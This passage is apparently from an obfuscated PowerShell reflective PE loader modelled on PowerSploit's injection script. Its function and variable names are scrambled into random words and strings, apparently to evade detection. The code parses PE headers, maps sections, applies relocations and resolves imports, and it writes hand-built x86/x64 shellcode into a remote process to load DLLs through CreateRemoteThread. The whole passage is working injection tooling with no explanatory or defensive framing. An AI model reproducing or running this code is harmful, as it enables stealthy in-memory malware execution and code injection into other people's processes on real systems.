		$PEInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value ($oobCjRDD99.NtHeadersPtr)
		$PEInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value ($oobCjRDD99.PE64Bit)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($oobCjRDD99.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		
		if ($PEInfo.PE64Bit -eq $true)
		{
			[IntPtr]$QFapNKsF99 = [IntPtr](teepee ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$wmxAHjcd99.IMAGE_NT_HEADERS64)))
			$PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $QFapNKsF99
		}
		else
		{
			[IntPtr]$QFapNKsF99 = [IntPtr](teepee ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$wmxAHjcd99.IMAGE_NT_HEADERS32)))
			$PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $QFapNKsF99
		}
		
		if (($oobCjRDD99.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_DLL) -eq $Win32Constants.IMAGE_FILE_DLL)
		{
			$PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'DLL'
		}
		elseif (($oobCjRDD99.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE) -eq $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE)
		{
			$PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'EXE'
		}
		else
		{
			Throw "PE file is not an EXE or DLL"
		}
		
		return $PEInfo
	}
	
	
	Function fourteenths
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$zookRCtG99,
		
		[Parameter(Position=1, Mandatory=$true)]
		[IntPtr]
		$lanyXJNl99
		)
		
		$THQIlluH99 = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		
		$DwjOtqMA99 = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($lanyXJNl99)
		$JTSetXTz99 = [UIntPtr][UInt64]([UInt64]$DwjOtqMA99.Length + 1)
		$aZzobZzA99 = $GMTlJquq99.VirtualAllocEx.Invoke($zookRCtG99, [IntPtr]::Zero, $JTSetXTz99, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if ($aZzobZzA99 -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process"
		}
		[UIntPtr]$nnjDLRCX99 = [UIntPtr]::Zero
		$JjRBItJb99 = $GMTlJquq99.WriteProcessMemory.Invoke($zookRCtG99, $aZzobZzA99, $lanyXJNl99, $JTSetXTz99, [Ref]$nnjDLRCX99)
		
		if ($JjRBItJb99 -eq $false)
		{
			Throw "Unable to write DLL path to remote process memory"
		}
		if ($JTSetXTz99 -ne $nnjDLRCX99)
		{
			Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
		}
		
		$BSPaOBoi99 = $GMTlJquq99.GetModuleHandle.Invoke("kernel32.dll")
		$obMqeFAM99 = $GMTlJquq99.GetProcAddress.Invoke($BSPaOBoi99, "LoadLibraryA") #Kernel32 loaded to the same address for all processes
		
		[IntPtr]$yOlrbdxO99 = [IntPtr]::Zero
		if ($PEInfo.PE64Bit -eq $true)
		{
			$DsemzrqD99 = $GMTlJquq99.VirtualAllocEx.Invoke($zookRCtG99, [IntPtr]::Zero, $JTSetXTz99, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			if ($DsemzrqD99 -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process for the return value of LoadLibraryA"
			}
			
			
			$TecAFoSs99 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			$epRgABjy99 = @(0x48, 0xba)
			$wngxloYm99 = @(0xff, 0xd2, 0x48, 0xba)
			$RJHQbiUK99 = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
			
			$TcehdClB99 = $TecAFoSs99.Length + $epRgABjy99.Length + $wngxloYm99.Length + $RJHQbiUK99.Length + ($THQIlluH99 * 3)
			$aOFXnsxo99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TcehdClB99)
			$ASDxFcyi99 = $aOFXnsxo99
			
			personalize -Bytes $TecAFoSs99 -iHYgyLYx99 $aOFXnsxo99
			$aOFXnsxo99 = teepee $aOFXnsxo99 ($TecAFoSs99.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($aZzobZzA99, $aOFXnsxo99, $false)
			$aOFXnsxo99 = teepee $aOFXnsxo99 ($THQIlluH99)
			personalize -Bytes $epRgABjy99 -iHYgyLYx99 $aOFXnsxo99
			$aOFXnsxo99 = teepee $aOFXnsxo99 ($epRgABjy99.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($obMqeFAM99, $aOFXnsxo99, $false)
			$aOFXnsxo99 = teepee $aOFXnsxo99 ($THQIlluH99)
			personalize -Bytes $wngxloYm99 -iHYgyLYx99 $aOFXnsxo99
			$aOFXnsxo99 = teepee $aOFXnsxo99 ($wngxloYm99.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($DsemzrqD99, $aOFXnsxo99, $false)
			$aOFXnsxo99 = teepee $aOFXnsxo99 ($THQIlluH99)
			personalize -Bytes $RJHQbiUK99 -iHYgyLYx99 $aOFXnsxo99
			$aOFXnsxo99 = teepee $aOFXnsxo99 ($RJHQbiUK99.Length)
			
			$KodyTjfM99 = $GMTlJquq99.VirtualAllocEx.Invoke($zookRCtG99, [IntPtr]::Zero, [UIntPtr][UInt64]$TcehdClB99, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			if ($KodyTjfM99 -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process for shellcode"
			}
			
			$JjRBItJb99 = $GMTlJquq99.WriteProcessMemory.Invoke($zookRCtG99, $KodyTjfM99, $ASDxFcyi99, [UIntPtr][UInt64]$TcehdClB99, [Ref]$nnjDLRCX99)
			if (($JjRBItJb99 -eq $false) -or ([UInt64]$nnjDLRCX99 -ne [UInt64]$TcehdClB99))
			{
				Throw "Unable to write shellcode to remote process memory."
			}
			
			$rUcofqbc99 = Gainsborough -AWGiTHqY99 $zookRCtG99 -StartAddress $KodyTjfM99 -GMTlJquq99$GMTlJquq99#-
			$tjxmMPpq99 = $GMTlJquq99.WaitForSingleObject.Invoke($rUcofqbc99, 20000)
			if ($tjxmMPpq99 -ne 0)
			{
				Throw "Call to CreateRemoteThread to call GetProcAddress failed."
			}
			
			[IntPtr]$CScUGVmt99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($THQIlluH99)
			$tjxmMPpq99 = $GMTlJquq99.ReadProcessMemory.Invoke($zookRCtG99, $DsemzrqD99, $CScUGVmt99, [UIntPtr][UInt64]$THQIlluH99, [Ref]$nnjDLRCX99)
			if ($tjxmMPpq99 -eq $false)
			{
				Throw "Call to ReadProcessMemory failed"
			}
			[IntPtr]$yOlrbdxO99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($CScUGVmt99, [Type][IntPtr])
			$GMTlJquq99.VirtualFreeEx.Invoke($zookRCtG99, $DsemzrqD99, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			$GMTlJquq99.VirtualFreeEx.Invoke($zookRCtG99, $KodyTjfM99, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		}
		else
		{
			[IntPtr]$rUcofqbc99 = Gainsborough -AWGiTHqY99 $zookRCtG99 -StartAddress $obMqeFAM99 -YqtQuYje99 $aZzobZzA99 -GMTlJquq99$GMTlJquq99#-
			$tjxmMPpq99 = $GMTlJquq99.WaitForSingleObject.Invoke($rUcofqbc99, 20000)
			if ($tjxmMPpq99 -ne 0)
			{
				Throw "Call to CreateRemoteThread to call GetProcAddress failed."
			}
			
			[Int32]$FHFhRNVG99 = 0
			$tjxmMPpq99 = $GMTlJquq99.GetExitCodeThread.Invoke($rUcofqbc99, [Ref]$FHFhRNVG99)
			if (($tjxmMPpq99 -eq 0) -or ($FHFhRNVG99 -eq 0))
			{
				Throw "Call to GetExitCodeThread failed"
			}
			
			[IntPtr]$yOlrbdxO99 = [IntPtr]$FHFhRNVG99
		}
		
		$GMTlJquq99.VirtualFreeEx.Invoke($zookRCtG99, $aZzobZzA99, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		
		return $yOlrbdxO99
	}
	
	
	Function calendar
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$zookRCtG99,
		
		[Parameter(Position=1, Mandatory=$true)]
		[IntPtr]
		$itwlsLZW99,
		
		[Parameter(Position=2, Mandatory=$true)]
		[String]
		$FunctionName
		)
		$THQIlluH99 = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		$WizTMoKE99 = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($FunctionName)
		
		$mOiLCSan99 = [UIntPtr][UInt64]([UInt64]$FunctionName.Length + 1)
		$JHnenbhV99 = $GMTlJquq99.VirtualAllocEx.Invoke($zookRCtG99, [IntPtr]::Zero, $mOiLCSan99, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if ($JHnenbhV99 -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process"
		}
		[UIntPtr]$nnjDLRCX99 = [UIntPtr]::Zero
		$JjRBItJb99 = $GMTlJquq99.WriteProcessMemory.Invoke($zookRCtG99, $JHnenbhV99, $WizTMoKE99, $mOiLCSan99, [Ref]$nnjDLRCX99)
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($WizTMoKE99)
		if ($JjRBItJb99 -eq $false)
		{
			Throw "Unable to write DLL path to remote process memory"
		}
		if ($mOiLCSan99 -ne $nnjDLRCX99)
		{
			Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
		}
		
		$BSPaOBoi99 = $GMTlJquq99.GetModuleHandle.Invoke("kernel32.dll")
		$TdFhmMow99 = $GMTlJquq99.GetProcAddress.Invoke($BSPaOBoi99, "GetProcAddress") #Kernel32 loaded to the same address for all processes
		
		$EGfkntYa99 = $GMTlJquq99.VirtualAllocEx.Invoke($zookRCtG99, [IntPtr]::Zero, [UInt64][UInt64]$THQIlluH99, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if ($EGfkntYa99 -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process for the return value of GetProcAddress"
		}
		
		
		[Byte[]]$foXYSjMC99 = @()
		if ($PEInfo.PE64Bit -eq $true)
		{
			$VzfwewXn99 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			$XXCpniqi99 = @(0x48, 0xba)
			$xEAAcLCt99 = @(0x48, 0xb8)
			$dKnmMhRD99 = @(0xff, 0xd0, 0x48, 0xb9)
			$flIQqPLL99 = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
		}
		else
		{
			$VzfwewXn99 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)
			$XXCpniqi99 = @(0xb9)
			$xEAAcLCt99 = @(0x51, 0x50, 0xb8)
			$dKnmMhRD99 = @(0xff, 0xd0, 0xb9)
			$flIQqPLL99 = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3)
		}
		$TcehdClB99 = $VzfwewXn99.Length + $XXCpniqi99.Length + $xEAAcLCt99.Length + $dKnmMhRD99.Length + $flIQqPLL99.Length + ($THQIlluH99 * 4)
		$aOFXnsxo99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TcehdClB99)
		$ASDxFcyi99 = $aOFXnsxo99
		
		personalize -Bytes $VzfwewXn99 -iHYgyLYx99 $aOFXnsxo99
		$aOFXnsxo99 = teepee $aOFXnsxo99 ($VzfwewXn99.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($itwlsLZW99, $aOFXnsxo99, $false)
		$aOFXnsxo99 = teepee $aOFXnsxo99 ($THQIlluH99)
		personalize -Bytes $XXCpniqi99 -iHYgyLYx99 $aOFXnsxo99
		$aOFXnsxo99 = teepee $aOFXnsxo99 ($XXCpniqi99.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($JHnenbhV99, $aOFXnsxo99, $false)
		$aOFXnsxo99 = teepee $aOFXnsxo99 ($THQIlluH99)
		personalize -Bytes $xEAAcLCt99 -iHYgyLYx99 $aOFXnsxo99
		$aOFXnsxo99 = teepee $aOFXnsxo99 ($xEAAcLCt99.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($TdFhmMow99, $aOFXnsxo99, $false)
		$aOFXnsxo99 = teepee $aOFXnsxo99 ($THQIlluH99)
		personalize -Bytes $dKnmMhRD99 -iHYgyLYx99 $aOFXnsxo99
		$aOFXnsxo99 = teepee $aOFXnsxo99 ($dKnmMhRD99.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($EGfkntYa99, $aOFXnsxo99, $false)
		$aOFXnsxo99 = teepee $aOFXnsxo99 ($THQIlluH99)
		personalize -Bytes $flIQqPLL99 -iHYgyLYx99 $aOFXnsxo99
		$aOFXnsxo99 = teepee $aOFXnsxo99 ($flIQqPLL99.Length)
		
		$KodyTjfM99 = $GMTlJquq99.VirtualAllocEx.Invoke($zookRCtG99, [IntPtr]::Zero, [UIntPtr][UInt64]$TcehdClB99, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
		if ($KodyTjfM99 -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process for shellcode"
		}
		
		$JjRBItJb99 = $GMTlJquq99.WriteProcessMemory.Invoke($zookRCtG99, $KodyTjfM99, $ASDxFcyi99, [UIntPtr][UInt64]$TcehdClB99, [Ref]$nnjDLRCX99)
		if (($JjRBItJb99 -eq $false) -or ([UInt64]$nnjDLRCX99 -ne [UInt64]$TcehdClB99))
		{
			Throw "Unable to write shellcode to remote process memory."
		}
		
		$rUcofqbc99 = Gainsborough -AWGiTHqY99 $zookRCtG99 -StartAddress $KodyTjfM99 -GMTlJquq99$GMTlJquq99#-
		$tjxmMPpq99 = $GMTlJquq99.WaitForSingleObject.Invoke($rUcofqbc99, 20000)
		if ($tjxmMPpq99 -ne 0)
		{
			Throw "Call to CreateRemoteThread to call GetProcAddress failed."
		}
		
		[IntPtr]$CScUGVmt99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($THQIlluH99)
		$tjxmMPpq99 = $GMTlJquq99.ReadProcessMemory.Invoke($zookRCtG99, $EGfkntYa99, $CScUGVmt99, [UIntPtr][UInt64]$THQIlluH99, [Ref]$nnjDLRCX99)
		if (($tjxmMPpq99 -eq $false) -or ($nnjDLRCX99 -eq 0))
		{
			Throw "Call to ReadProcessMemory failed"
		}
		[IntPtr]$rHBqkbRV99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($CScUGVmt99, [Type][IntPtr])
		$GMTlJquq99.VirtualFreeEx.Invoke($zookRCtG99, $KodyTjfM99, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		$GMTlJquq99.VirtualFreeEx.Invoke($zookRCtG99, $JHnenbhV99, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		$GMTlJquq99.VirtualFreeEx.Invoke($zookRCtG99, $EGfkntYa99, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		
		return $rHBqkbRV99
	}
	Function deforms
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Byte[]]
		$jfneoYUd99,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$GMTlJquq99,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$wmxAHjcd99
		)
		
		for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
		{
			[IntPtr]$QFapNKsF99 = [IntPtr](teepee ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$wmxAHjcd99.IMAGE_SECTION_HEADER)))
			$FjMNZoVv99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($QFapNKsF99, [Type]$wmxAHjcd99.IMAGE_SECTION_HEADER)
		
			[IntPtr]$NnRCupFx99 = [IntPtr](teepee ([Int64]$PEInfo.PEHandle) ([Int64]$FjMNZoVv99.VirtualAddress))
			
			$oZYMyujO99 = $FjMNZoVv99.SizeOfRawData
			if ($FjMNZoVv99.PointerToRawData -eq 0)
			{
				$oZYMyujO99 = 0
			}
			
			if ($oZYMyujO99 -gt $FjMNZoVv99.VirtualSize)
			{
				$oZYMyujO99 = $FjMNZoVv99.VirtualSize
			}
			
			if ($oZYMyujO99 -gt 0)
			{
				deprecate -ItYCAMtj99 "deforms::MarshalCopy" -PEInfo $PEInfo -StartAddress $NnRCupFx99 -Size $oZYMyujO99 | Out-Null
				[System.Runtime.InteropServices.Marshal]::Copy($jfneoYUd99, [Int32]$FjMNZoVv99.PointerToRawData, $NnRCupFx99, $oZYMyujO99)
			}
		
			if ($FjMNZoVv99.SizeOfRawData -lt $FjMNZoVv99.VirtualSize)
			{
				$xLNlpcUt99 = $FjMNZoVv99.VirtualSize - $oZYMyujO99
				[IntPtr]$StartAddress = [IntPtr](teepee ([Int64]$NnRCupFx99) ([Int64]$oZYMyujO99))
				deprecate -ItYCAMtj99 "deforms::Memset" -PEInfo $PEInfo -StartAddress $StartAddress -Size $xLNlpcUt99 | Out-Null
				$GMTlJquq99.memset.Invoke($StartAddress, 0, [IntPtr]$xLNlpcUt99) | Out-Null
			}
		}
	}
	Function windlass
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$lAProRQK99,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$wmxAHjcd99
		)
		
		[Int64]$mBuwJarB99 = 0
		$dFJWXLlA99 = $true #Track if the difference variable should be added or subtracted from variables
		[UInt32]$FIZgFxPI99 = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$wmxAHjcd99.IMAGE_BASE_RELOCATION)
		
		if (($lAProRQK99 -eq [Int64]$PEInfo.EffectivePEHandle) `
				-or ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.Size -eq 0))
		{
			return
		}
		elseif ((guesses ($lAProRQK99) ($PEInfo.EffectivePEHandle)) -eq $true)
		{
			$mBuwJarB99 = swerving ($lAProRQK99) ($PEInfo.EffectivePEHandle)
			$dFJWXLlA99 = $false
		}
		elseif ((guesses ($PEInfo.EffectivePEHandle) ($lAProRQK99)) -eq $true)
		{
			$mBuwJarB99 = swerving ($PEInfo.EffectivePEHandle) ($lAProRQK99)
		}
		
		[IntPtr]$mSTxBaIS99 = [IntPtr](teepee ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.VirtualAddress))
		while($true)
		{
			$eaiAJIKK99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($mSTxBaIS99, [Type]$wmxAHjcd99.IMAGE_BASE_RELOCATION)
			if ($eaiAJIKK99.SizeOfBlock -eq 0)
			{
				break
			}
			[IntPtr]$aJZhoZxT99 = [IntPtr](teepee ([Int64]$PEInfo.PEHandle) ([Int64]$eaiAJIKK99.VirtualAddress))
			$PKazxrRo99 = ($eaiAJIKK99.SizeOfBlock - $FIZgFxPI99) / 2
			for($i = 0; $i -lt $PKazxrRo99; $i++)
			{
				$IEcMniyT99 = [IntPtr](teepee ([IntPtr]$mSTxBaIS99) ([Int64]$FIZgFxPI99 + (2 * $i)))
				[UInt16]$mxNSlMGn99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($IEcMniyT99, [Type][UInt16])
				[UInt16]$XMmnqMDX99 = $mxNSlMGn99 -band 0x0FFF
				[UInt16]$ENGFPFSP99 = $mxNSlMGn99 -band 0xF000
				for ($j = 0; $j -lt 12; $j++)
				{
					$ENGFPFSP99 = [Math]::Floor($ENGFPFSP99 / 2)
				}
				if (($ENGFPFSP99 -eq $Win32Constants.IMAGE_REL_BASED_HIGHLOW) `
						-or ($ENGFPFSP99 -eq $Win32Constants.IMAGE_REL_BASED_DIR64))
				{			
					[IntPtr]$HJzLldqz99 = [IntPtr](teepee ([Int64]$aJZhoZxT99) ([Int64]$XMmnqMDX99))
					[IntPtr]$KlnIgLKa99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($HJzLldqz99, [Type][IntPtr])
		
					if ($dFJWXLlA99 -eq $true)
					{
						[IntPtr]$KlnIgLKa99 = [IntPtr](teepee ([Int64]$KlnIgLKa99) ($mBuwJarB99))
					}
					else
					{
						[IntPtr]$KlnIgLKa99 = [IntPtr](swerving ([Int64]$KlnIgLKa99) ($mBuwJarB99))
					}				
					[System.Runtime.InteropServices.Marshal]::StructureToPtr($KlnIgLKa99, $HJzLldqz99, $false) | Out-Null
				}
				elseif ($ENGFPFSP99 -ne $Win32Constants.IMAGE_REL_BASED_ABSOLUTE)
				{
					Throw "Unknown relocation found, relocation value: $ENGFPFSP99, relocationinfo: $mxNSlMGn99"
				}
			}
			
			$mSTxBaIS99 = [IntPtr](teepee ([Int64]$mSTxBaIS99) ([Int64]$eaiAJIKK99.SizeOfBlock))
		}
	}
	Function darkly
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$GMTlJquq99,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$wmxAHjcd99,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 4, Mandatory = $false)]
		[IntPtr]
		$zookRCtG99
		)
		
		$JPBwNdSD99 = $false
		if ($PEInfo.PEHandle -ne $PEInfo.EffectivePEHandle)
		{
			$JPBwNdSD99 = $true
		}
		
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]$dWDvlOYQ99 = teepee ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			
			while ($true)
			{
				$OOKmGSWV99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($dWDvlOYQ99, [Type]$wmxAHjcd99.IMAGE_IMPORT_DESCRIPTOR)
				
				if ($OOKmGSWV99.Characteristics -eq 0 `
						-and $OOKmGSWV99.FirstThunk -eq 0 `
						-and $OOKmGSWV99.ForwarderChain -eq 0 `
						-and $OOKmGSWV99.Name -eq 0 `
						-and $OOKmGSWV99.TimeDateStamp -eq 0)
				{
					Write-Verbose "Done importing DLL imports"
					break
				}
				$XovgFNfI99 = [IntPtr]::Zero
				$lanyXJNl99 = (teepee ([Int64]$PEInfo.PEHandle) ([Int64]$OOKmGSWV99.Name))
				$DwjOtqMA99 = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($lanyXJNl99)
				
				if ($JPBwNdSD99 -eq $true)
				{
					$XovgFNfI99 = fourteenths -zookRCtG99 $zookRCtG99 -lanyXJNl99 $lanyXJNl99
				}
				else
				{
					$XovgFNfI99 = $GMTlJquq99.LoadLibrary.Invoke($DwjOtqMA99)
				}
				if (($XovgFNfI99 -eq $null) -or ($XovgFNfI99 -eq [IntPtr]::Zero))
				{
					throw "Error importing DLL, DLLName: $DwjOtqMA99"
				}
				
				[IntPtr]$CRdOuvSh99 = teepee ($PEInfo.PEHandle) ($OOKmGSWV99.FirstThunk)
				[IntPtr]$WwYASamO99 = teepee ($PEInfo.PEHandle) ($OOKmGSWV99.Characteristics) #Characteristics is overloaded with OriginalFirstThunk
				[IntPtr]$xQtyqRgz99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($WwYASamO99, [Type][IntPtr])
				
				while ($xQtyqRgz99 -ne [IntPtr]::Zero)
				{
					$EGxfOlMP99 = ''
					[IntPtr]$VklBQayx99 = [IntPtr]::Zero
					if([Int64]$xQtyqRgz99 -lt 0)
					{
						$EGxfOlMP99 = [Int64]$xQtyqRgz99 -band 0xffff #This is actually a lookup by ordinal
					}
					else
					{
						[IntPtr]$krTRmTOW99 = teepee ($PEInfo.PEHandle) ($xQtyqRgz99)
						$krTRmTOW99 = teepee $krTRmTOW99 ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16]))
						$EGxfOlMP99 = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($krTRmTOW99)
					}
					
					if ($JPBwNdSD99 -eq $true)
					{
						[IntPtr]$VklBQayx99 = calendar -zookRCtG99 $zookRCtG99 -itwlsLZW99 $XovgFNfI99 -FunctionName $EGxfOlMP99
					}
					else
					{
						if($EGxfOlMP99 -is [string])
						{
						    [IntPtr]$VklBQayx99 = $GMTlJquq99.GetProcAddress.Invoke($XovgFNfI99, $EGxfOlMP99)
						}
						else
						{
						    [IntPtr]$VklBQayx99 = $GMTlJquq99.GetProcAddressOrdinal.Invoke($XovgFNfI99, $EGxfOlMP99)
						}
					}
					
					if ($VklBQayx99 -eq $null -or $VklBQayx99 -eq [IntPtr]::Zero)
					{
						Throw "New function reference is null, this is almost certainly a bug in this script. Function: $EGxfOlMP99. Dll: $DwjOtqMA99"
					}
					[System.Runtime.InteropServices.Marshal]::StructureToPtr($VklBQayx99, $CRdOuvSh99, $false)
					
					$CRdOuvSh99 = teepee ([Int64]$CRdOuvSh99) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]$WwYASamO99 = teepee ([Int64]$WwYASamO99) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]$xQtyqRgz99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($WwYASamO99, [Type][IntPtr])
				}
				
				$dWDvlOYQ99 = teepee ($dWDvlOYQ99) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$wmxAHjcd99.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
	}
	Function penises
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt32]
		$OnpSvfGm99
		)
		
		$YOPkKJuK99 = 0x0
		if (($OnpSvfGm99 -band $Win32Constants.IMAGE_SCN_MEM_EXECUTE) -gt 0)
		{
			if (($OnpSvfGm99 -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if (($OnpSvfGm99 -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$YOPkKJuK99 = $Win32Constants.PAGE_EXECUTE_READWRITE
				}
				else
				{
					$YOPkKJuK99 = $Win32Constants.PAGE_EXECUTE_READ
				}
			}
			else
			{
				if (($OnpSvfGm99 -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$YOPkKJuK99 = $Win32Constants.PAGE_EXECUTE_WRITECOPY
				}
				else
				{
					$YOPkKJuK99 = $Win32Constants.PAGE_EXECUTE
				}
			}
		}
		else
		{
			if (($OnpSvfGm99 -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if (($OnpSvfGm99 -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$YOPkKJuK99 = $Win32Constants.PAGE_READWRITE
				}
				else
				{
					$YOPkKJuK99 = $Win32Constants.PAGE_READONLY
				}
			}
			else
			{
				if (($OnpSvfGm99 -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$YOPkKJuK99 = $Win32Constants.PAGE_WRITECOPY
				}
				else
				{
					$YOPkKJuK99 = $Win32Constants.PAGE_NOACCESS
				}
			}
		}
		
		if (($OnpSvfGm99 -band $Win32Constants.IMAGE_SCN_MEM_NOT_CACHED) -gt 0)
		{
			$YOPkKJuK99 = $YOPkKJuK99 -bor $Win32Constants.PAGE_NOCACHE
		}
		
		return $YOPkKJuK99
	}
	Function chlorides
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$GMTlJquq99,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$wmxAHjcd99
		)
		
		for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
		{
			[IntPtr]$QFapNKsF99 = [IntPtr](teepee ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$wmxAHjcd99.IMAGE_SECTION_HEADER)))
